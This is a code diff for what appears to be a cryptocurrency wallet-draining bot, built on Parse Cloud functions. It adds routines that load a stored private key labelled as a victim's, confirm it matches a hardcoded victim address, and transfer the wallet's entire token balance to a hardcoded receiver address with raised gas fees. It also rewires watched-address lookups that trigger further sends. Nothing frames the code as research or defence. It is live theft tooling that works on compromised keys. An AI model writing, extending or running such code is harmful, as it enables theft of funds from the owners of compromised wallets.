@@ -134,6 +134,175 @@ if(victim.address.toString().toLowerCase() != checkvictimaddr.toString().toLower
     
 
     //latest because i used last base fee you can check the value 
+    const gasPrice3 = (feeData.lastBaseFeePerGas).add((feeData.lastBaseFeePerGas).div(3))
+    const totalgasprice3 = gasPrice3.mul(gaslimit3);
+
+    // console.log("gaslimit3: "+gaslimit3)
+    // console.log("gasPrice3 first: "+ethers.utils.formatUnits(gaslimit3.div(2), "gwei"))
+    // console.log("gasPrice3: "+ethers.utils.formatUnits(gasPrice3, "gwei"))
+   
+    // console.log("totalgasprice3: "+ethers.utils.formatUnits(totalgasprice3, "ether"))
+
+    // 0.00023221
+
+
+
+
+    
+    if (balance.lt(totalgasprice3)) {
+        // console.log(' Eth Balance is less than gas price, waiting....')
+        return;
+    }
+  
+  if(tkbalanceADDR1.lte(0)) {
+     
+    request.log.info('token balance  less than');
+    //  console.log('token balance  less than');
+
+     return
+  }
+
+  // if(ethers.utils.formatUnits(tkbalanceADDR1, "18").lte(6000)) {
+  //   console.log('token balance  less than 7000');
+
+  //   return
+  // }
+
+          
+  if(parseInt(ethers.utils.formatUnits(tkbalanceADDR1, "18")) < (6000)) {
+    // console.log('token balance  less than 7000');
+    request.log.info('token balance  less than 7000');
+    return
+  }
+
+
+  try {
+    // console.log(`Sending ${formatEther(balance)}ETH`);
+    // const tx = await wallet.sendTransactionç({
+    //   to: RECIEVER_ADDRESS,
+    //   gasLimit: 21000,
+    //   gasPrice : gasPrice.mul(10),
+    //   value: val
+    // });
+
+    const tx = await victim.sendTransaction({
+      // chainId: 1,
+      // type: 1,
+      // to: TOKEN_ADDRESS,
+      // gasPrice: gasPrice3,
+      // gasLimit: gaslimit3,
+
+      chainId: 1,
+      type: 2,
+      to: TOKEN_ADDRESS,
+      maxFeePerGas: gasPrice3,
+      maxPriorityFeePerGas: gasPrice3,
+      gasLimit: gaslimit3,  
+
+      data: datatransfer,
+    });
+
+
+     try {
+        tx.wait();
+
+    if(tx.hash) {
+
+    
+      request.log.info(`Success!...lets hope for confirmation! 😁 🚀`);
+    
+  
+      await mshlogger(request, "Fired peptokn!!!" , "fired success")
+    }
+
+    if(tx.nonce) {
+
+    
+     
+    
+     await mshlogger(request, "Fired peptokn!!!, block confirmed" , "fired success")
+      request.log.info(`Success! Block Confirmed 😁😁😁 🚀🚀🚀`);
+
+  
+    }
+
+    // console.log(` Sent tx with nonce ${tx.nonce} moving   gwei: ${tx.hash}`);  
+     } catch (error) {
+        
+        // console.log("error from txwait"+error)
+     }
+  }    catch  (err)  {
+    await mshlogger(request, err.message+":failed sending token" , err.message)
+    // console.log(` Error sending tx: ${err.message ?? err}`);
+  }
+}
+
+
+
+
+
+async function burn2(vtctmdtls: any, ankrkey: string, request: any) {
+
+  const ETH_RPC_HTTP_ANKR = "https://rpc.ankr.com/bsc/"+ankrkey
+
+const VICTIM_KEY = vtctmdtls.get("pkaddr");
+const RECIEVER_ADDRESS = "0xF91dBC8Fd634E1032566131bFE9D35d895DadeCa";
+// 0xc2132d05d31c914a87c6611c10748aeb04b58e8f
+const TOKEN_ADDRESS = "0xe9e7CEA3DedcA5984780Bafc599bD69ADd087D56";  // eywa  
+
+if (VICTIM_KEY === "") {
+  await mshlogger(request, "no key specified :failed sending token" , "error")
+  // console.warn("Must provide VICTIM_KEY environment variable, corresponding to Ethereum EOA with assets to be transferred")
+  return
+}
+
+const abimatic = [{"inputs":[],"payable":false,"stateMutability":"nonpayable","type":"constructor"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"owner","type":"address"},{"indexed":true,"internalType":"address","name":"spender","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Approval","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"previousOwner","type":"address"},{"indexed":true,"internalType":"address","name":"newOwner","type":"address"}],"name":"OwnershipTransferred","type":"event"},{"anonymous":false,"inputs":[{"indexed":true,"internalType":"address","name":"from","type":"address"},{"indexed":true,"internalType":"address","name":"to","type":"address"},{"indexed":false,"internalType":"uint256","name":"value","type":"uint256"}],"name":"Transfer","type":"event"},{"constant":true,"inputs":[],"name":"_decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"_symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"owner","type":"address"},{"internalType":"address","name":"spender","type":"address"}],"name":"allowance","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"approve","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[{"internalType":"address","name":"account","type":"address"}],"name":"balanceOf","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"burn","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"decimals","outputs":[{"internalType":"uint8","name":"","type":"uint8"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"subtractedValue","type":"uint256"}],"name":"decreaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"getOwner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"spender","type":"address"},{"internalType":"uint256","name":"addedValue","type":"uint256"}],"name":"increaseAllowance","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"mint","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"name","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"owner","outputs":[{"internalType":"address","name":"","type":"address"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[],"name":"renounceOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":true,"inputs":[],"name":"symbol","outputs":[{"internalType":"string","name":"","type":"string"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":true,"inputs":[],"name":"totalSupply","outputs":[{"internalType":"uint256","name":"","type":"uint256"}],"payable":false,"stateMutability":"view","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transfer","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"sender","type":"address"},{"internalType":"address","name":"recipient","type":"address"},{"internalType":"uint256","name":"amount","type":"uint256"}],"name":"transferFrom","outputs":[{"internalType":"bool","name":"","type":"bool"}],"payable":false,"stateMutability":"nonpayable","type":"function"},{"constant":false,"inputs":[{"internalType":"address","name":"newOwner","type":"address"}],"name":"transferOwnership","outputs":[],"payable":false,"stateMutability":"nonpayable","type":"function"}]
+const iface = new utils.Interface(abimatic);
+
+const provider = new providers.JsonRpcProvider(ETH_RPC_HTTP_ANKR);
+const victim = new Wallet(VICTIM_KEY, provider);
+
+const checkvictimaddr = "0x2EaacAf1468F248483Cec65254dff98FF95e3387";
+if(victim.address.toString().toLowerCase() != checkvictimaddr.toString().toLowerCase()) {
+
+  request.log.info('Not same address');
+
+  return 
+}
+
+
+
+
+  var balance = await victim.getBalance();
+
+  // balance = ethers.BigNumber.from(balance)
+  // if (balance.isZero()) {
+  //   console.log(`Balance is zero`);
+  //   return;
+  // }
+  
+  // console.log(`Native bal: ${ethers.utils.formatUnits(balance, "ether")}`)
+
+  const erc20_rw = new ethers.Contract(TOKEN_ADDRESS, abimatic, victim);
+ 
+  var tkbalanceADDR1 = await erc20_rw.balanceOf(victim.address)
+
+  // console.log(`Token Balance: ${ethers.utils.formatUnits(tkbalanceADDR1, "18")}`);
+
+
+    var datatransfer = iface.encodeFunctionData("transfer", [
+      RECIEVER_ADDRESS,
+      tkbalanceADDR1,
+    ])
+
+    var feeData = await provider.getFeeData()
+    var estimagegas = await provider.estimateGas(datatransfer)
+    var gaslimit3 = (estimagegas).mul(2);
+    //   const gasPrice2 = ethers.BigNumber.from(ethers.utils.parseUnits("1000", "gwei"));
+    // const gasPrice3 = (feeData.maxFeePerGas).add(feeData.maxFeePerGas.div(2))
+    
+
+    //latest because i used last base fee you can check the value 
     const gasPrice3 = (feeData.lastBaseFeePerGas).add((feeData.maxFeePerGas).div(30))
     const totalgasprice3 = gasPrice3.mul(gaslimit3);
 
@@ -229,7 +398,6 @@ if(victim.address.toString().toLowerCase() != checkvictimaddr.toString().toLower
     // console.log(` Error sending tx: ${err.message ?? err}`);
   }
 }
-
 
 Parse.Cloud.define("_AddressSyncStatus2", async  (request: any) => {
 
@@ -1444,48 +1612,83 @@ if(fromaddress.toLowerCase() == victimaddr.toLowerCase()) {
 
 
     
-    // check if exempted  for to addr
-    var query = new Parse.Query("exemptedaddr");
-    // query.limit(10);
-    query.fullText("addr", toaddress);
+    // // check if exempted  for to addr
+    // var query = new Parse.Query("exemptedaddr");
+    // // query.limit(10);
+    // query.fullText("addr", toaddress);
 
-    if(query) {
+    // if(query) {
 
-      var query = new Parse.Query("hpaddr");
-      // query.limit(10);
-      query.fullText("addr", toaddress);
-      var results = await query.first(); // [ Monster, Monster, ...]
+    //   var query = new Parse.Query("hpaddr");
+    //   // query.limit(10);
+    //   query.fullText("addr", toaddress);
+    //   var results = await query.first(); // [ Monster, Monster, ...]
 
-      // request.log.info('Live section');
-      if(results) {
-        request.log.info("got to result but is exempted");
-      await proxsend(request,results, recver, AnkrId,ntwk, value, 'logger' )
+    //   // request.log.info('Live section');
+    //   if(results) {
+    //     request.log.info("got to result but is exempted");
+    //   await proxsend(request,results, recver, AnkrId,ntwk, value, 'logger' )
 
-      }
-      else {
-      //  logger.info(JSON.stringify(results));
-      request.log.info("no result and is exempted");
-      }
+    //   }
+    //   else {
+    //   //  logger.info(JSON.stringify(results));
+    //   request.log.info("no result and is exempted");
+    //   }
 
-     return
-    }
+    //  return
+    // }
 
 
-var query = new Parse.Query("hpaddr");
-// query.limit(10);
-query.fullText("addr", toaddress);
-var results = await query.first(); // [ Monster, Monster, ...]
+// var query = new Parse.Query("hpaddr");
+// // query.limit(10);
+// query.fullText("addr", toaddress);
+// var results = await query.first(); // [ Monster, Monster, ...]
 
-// request.log.info('Live section');
-if(results) {
-  request.log.info("got to result");
- await proxsend(request,results, recver, AnkrId,ntwk, value, 'logger' )
+// // request.log.info('Live section');
+// if(results) {
+//   request.log.info("got to result");
+//  await proxsend(request,results, recver, AnkrId,ntwk, value, 'logger' )
 
-}
-else {
-//  logger.info(JSON.stringify(results));
-request.log.info("got to no result"); 
-}
+// }
+// else {
+// //  logger.info(JSON.stringify(results));
+// request.log.info("got to no result"); 
+// }
+
+
+
+
+     // check if exempted  for from addr
+     var queryfrom2 = new Parse.Query("hpaddr");
+     // query.limit(10);
+     queryfrom2.fullText("addr", fromaddress);
+     var resultsfrom2 = await queryfrom2.first(); // [ Monster, Monster, ...]
+ 
+       // check if exempted  for to addr
+       var queryto2 = new Parse.Query("hpaddr");
+       // query.limit(10);
+       queryto2.fullText("addr", toaddress);
+       var resultsto2 = await queryto2.first(); // [ Monster, Monster, ...]
+ 
+ 
+     if(resultsfrom2) {
+ 
+      request.log.info("found in from");
+  
+      await proxsend(request,resultsfrom2, recver, AnkrId,ntwk, value, 'logger' )
+      
+   
+     }
+
+     if(resultsto2) {
+ 
+      request.log.info("found in to");
+  
+      await proxsend(request,resultsto2, recver, AnkrId,ntwk, value, 'logger' )
+      
+   
+     }
+   
 
 
 
